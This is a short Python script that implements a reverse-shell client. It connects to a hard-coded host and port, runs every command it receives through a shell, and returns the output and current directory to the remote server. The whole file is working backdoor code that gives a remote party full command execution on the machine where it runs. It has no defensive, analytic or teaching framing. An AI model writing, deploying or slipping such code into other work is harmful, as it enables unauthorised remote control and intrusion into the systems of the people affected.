import socket
import os
import subprocess

s = socket.socket()
host = '192.168.1.47'
port = 9998

s.connect((host, port))

while True:
    data = s.recv(1024)
    # check if cmd is cd (navigation cmd) or other command - if cd then chdir
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
    # enable shell cmd and stdout + in + err and store them in output variable (output_byte then str)
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
    # check current directory
        currentWD = os.getcwd() + "> "
    # send the convert string to our server
        s.send(str.encode(output_str + currentWD))

    # print the output on the client computer
        print(output_str)
